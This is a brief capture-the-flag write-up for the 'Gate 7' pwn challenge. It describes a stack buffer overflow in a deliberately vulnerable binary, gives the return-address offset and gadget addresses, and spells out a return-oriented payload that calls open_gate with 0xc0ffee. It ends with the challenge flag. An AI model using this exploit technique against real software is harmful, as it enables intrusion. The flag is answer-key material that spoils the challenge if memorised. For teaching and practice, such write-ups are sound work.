# Gate 7

`nc gate7.wolvctf-2026.kctf.cloud 1337`

## Protections

Partial RELRO, no canary, NX, no PIE.

## Bug

`read_full(0, rbp-0x30, 0x80)` reads exactly 128 bytes into a 48-byte buffer. Offset to RIP: `0x30 + 8 = 0x38`.

`open_gate()` at `0x40120b` opens `/flag` when `rdi == 0xc0ffee`.

The useful `pop rdi; ret` starts at `0x401206`, inside the `gadget` symbol (`gadget + 4`).

## Exploit

```text
'A' * 0x30
'B' * 8
0x401206   pop rdi; ret
0xc0ffee
0x401207   ret (alignment)
0x40120b   open_gate
padding to 0x80
```

## Flag

`wctf{p0p_rd1_ret_th3_gate_1s_0p3n}`
